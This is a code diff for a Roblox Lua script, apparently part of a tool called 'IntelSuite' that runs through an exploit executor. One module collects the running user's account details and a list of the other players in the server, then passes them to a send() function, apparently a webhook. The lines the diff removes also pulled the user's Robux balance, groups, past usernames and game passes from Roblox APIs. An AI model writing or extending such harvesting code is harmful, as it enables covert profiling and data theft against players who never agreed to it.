@@ -133,122 +133,24 @@ end)
 task.wait(1)
 
 -- ============================================================
--- MODULE 2: Full Roblox API Scraper
+-- MODULE 2: Scraper
 -- ============================================================
 task.spawn(function()
     if not getgenv().IntelSuite.IsActive then return end
-    local uid = tostring(LocalPlayer.UserId)
-    local desc = "**User:** " .. LocalPlayer.Name ..
-        "\n**User ID:** " .. uid ..
+    local playerList, playerCount = getPlayerList()
+    send("SCRAPE DATA",
+        "**User:** " .. LocalPlayer.Name ..
+        "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
         "\n**Display Name:** " .. LocalPlayer.DisplayName ..
         "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
         "\n**Executor:** " .. getExec() ..
         "\n**Game:** " .. getGame() ..
         "\n**Place ID:** " .. tostring(game.PlaceId) ..
-        "\n**Job ID:** " .. tostring(game.JobId)
-
-    -- Premium check
-    local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
-    desc = desc .. "\n**Premium:** " .. tostring(premium)
-
-    -- Friends count
-    pcall(function()
-        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
-        if r then
-            local d = HttpService:JSONDecode(r)
-            desc = desc .. "\n**Friends:** " .. tostring(d.count)
-        end
-    end)
-
-    -- Followers count
-    pcall(function()
-        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
-        if r then
-            local d = HttpService:JSONDecode(r)
-            desc = desc .. "\n**Followers:** " .. tostring(d.count)
-        end
-    end)
-
-    -- Following count
-    pcall(function()
-        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followings/count")
-        if r then
-            local d = HttpService:JSONDecode(r)
-            desc = desc .. "\n**Following:** " .. tostring(d.count)
-        end
-    end)
-
-    -- Robux balance (if accessible)
-    pcall(function()
-        local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
-        if r then
-            local d = HttpService:JSONDecode(r)
-            if d.robux then
-                desc = desc .. "\n**Robux:** " .. tostring(d.robux)
-            end
-        end
-    end)
-
-    -- Groups
-    pcall(function()
-        local r = GET("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles")
-        if r then
-            local d = HttpService:JSONDecode(r)
-            if d.data then
-                local groups = "\n**Groups:**"
-                local count = 0
-                for _, g in ipairs(d.data) do
-                    if count >= 5 then break end
-                    groups = groups .. "\n  - " .. tostring(g.group.name) .. " [" .. tostring(g.role.name) .. "]"
-                    count = count + 1
-                end
-                desc = desc .. groups
-            end
-        end
-    end)
-
-    -- Past usernames
-    pcall(function()
-        local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
-        if r then
-            local d = HttpService:JSONDecode(r)
-            if d.data and #d.data > 0 then
-                local names = "\n**Past Usernames:**"
-                for _, n in ipairs(d.data) do
-                    names = names .. "\n  - " .. tostring(n.name)
-                end
-                desc = desc .. names
-            end
-        end
-    end)
-
-    -- Badge count
-    pcall(function()
-        local r = GET("https://badges.roblox.com/v1/users/" .. uid .. "/badges?limit=10")
-        if r then
-            local d = HttpService:JSONDecode(r)
-            if d.data then
-                desc = desc .. "\n**Badges (first 10):** " .. tostring(#d.data)
-            end
-        end
-    end)
-
-    -- Game passes owned
-    pcall(function()
-        local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
-        if r then
-            local d = HttpService:JSONDecode(r)
-            if d.data and #d.data > 0 then
-                local passes = "\n**Game Passes:**"
-                for _, p in ipairs(d.data) do
-                    passes = passes .. "\n  - " .. tostring(p.name)
-                end
-                desc = desc .. passes
-            end
-        end
-    end)
-
-    send("FULL ACCOUNT SCRAPE", desc, 65535)
+        "\n**Job ID:** " .. tostring(game.JobId) ..
+        "\n**Players in server:** " .. tostring(playerCount) .. playerList ..
+        "\n**Time:** " .. tostring(os.time()),
+        65535
+    )
 end)
 
 task.wait(1)
